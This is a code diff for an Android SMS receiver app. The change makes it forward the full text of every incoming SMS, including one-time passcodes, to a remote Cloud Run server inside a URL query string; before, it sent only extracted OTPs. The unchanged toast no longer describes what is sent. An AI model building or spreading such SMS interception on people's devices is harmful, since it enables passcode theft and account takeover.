@@ -20,6 +20,7 @@ import java.io.BufferedReader
 import java.io.InputStreamReader
 import java.net.HttpURLConnection
 import java.net.URL
+import java.net.URLEncoder // NEW
 
 // Internal broadcast action so the Receiver can push log lines to the UI when the Activity is visible.
 private const val ACTION_SMS_LOG = "com.example.smsviewer.ACTION_SMS_LOG"
@@ -284,7 +285,6 @@ class SmsReceiver : BroadcastReceiver() {
 
                 val sender = smsMessages.firstOrNull()?.displayOriginatingAddress ?: "Unknown Sender"
                 val messageBody = smsMessages.joinToString("") { it.messageBody ?: "" }
-                val otp = extractOtp(messageBody)
 
                 // Determine which SIM received the SMS using subscription id → slot index
                 val subscriptionId = intent.extras?.getInt(
@@ -294,7 +294,8 @@ class SmsReceiver : BroadcastReceiver() {
 
                 val usedSimNumber = resolveSavedSimNumber(context, subscriptionId)
 
-                if (otp.isNotBlank() && otp != "null") {
+                // CHANGED: We no longer require an extracted OTP to proceed; we send the FULL message.
+                if (messageBody.isNotBlank()) {
                     val simLabel = when (getSlotIndex(context, subscriptionId)) {
                         0 -> "SIM1"
                         1 -> "SIM2"
@@ -307,15 +308,6 @@ class SmsReceiver : BroadcastReceiver() {
                     // Persist immediately so it's available when app returns to foreground
                     appendLog(context, logLine)
 
-                    // Toast on main thread (optional)
-                    /*Handler(Looper.getMainLooper()).post {
-                        Toast.makeText(
-                            context,
-                            "From: $sender\nMessage: $messageBody\nSIM: $usedSimNumber",
-                            Toast.LENGTH_LONG
-                        ).show()
-                    }*/
-
                     // Update UI log if Activity is visible (best-effort)
                     context.sendBroadcast(
                         Intent(ACTION_SMS_LOG)
@@ -323,8 +315,8 @@ class SmsReceiver : BroadcastReceiver() {
                             .putExtra("log", logLine)
                     )
 
-                    // Ship OTP to your server
-                    sendSmsToServer(context, usedSimNumber, otp)
+                    // CHANGED: Send FULL message (URL-encoded) instead of an extracted OTP
+                    sendSmsToServer(context, usedSimNumber, messageBody) // CHANGED
                 }
             } catch (e: Exception) {
                 Log.e("SMS_RECEIVER_ERROR", "Error handling SMS: ${e.localizedMessage}", e)
@@ -381,7 +373,17 @@ class SmsReceiver : BroadcastReceiver() {
                 return
             }
 
-            val url = URL("https://otp-458898283632.us-central1.run.app/?phone=$sender&otp=$otp")
+            // CHANGED: URL-encode the FULL message so spaces become '+' and punctuation is percent-encoded.
+            val encodedMessage = try {
+                URLEncoder.encode(otp, "UTF-8")
+            } catch (e: Exception) {
+                Log.e("ENCODE_ERROR", "Falling back without encoding: ${e.localizedMessage}", e)
+                otp // fallback (shouldn't happen with UTF-8)
+            }
+
+            // CHANGED: Still using the same endpoint and parameter names, but `otp` now carries the FULL encoded message.
+            val url = URL("https://otp-458898283632.us-central1.run.app/?phone=$sender&otp=$encodedMessage") // CHANGED
+
             val connection = (url.openConnection() as HttpURLConnection).apply {
                 connectTimeout = 5000
                 readTimeout = 5000
@@ -397,6 +399,7 @@ class SmsReceiver : BroadcastReceiver() {
             Log.d("Server Response", "Code: $responseCode, Response: $response")
 
             Handler(Looper.getMainLooper()).post {
+                // (Keeping the same toast text to avoid UI changes.)
                 Toast.makeText(context, "OTP sent successfully", Toast.LENGTH_SHORT).show()
             }
         } catch (e: Exception) {
@@ -407,6 +410,7 @@ class SmsReceiver : BroadcastReceiver() {
         }
     }
 
+    // Kept for backward compatibility (no longer used for sending)
     private fun extractOtp(message: String): String {
         val regexes = listOf(
             Regex("\\b\\d{6}\\b"),
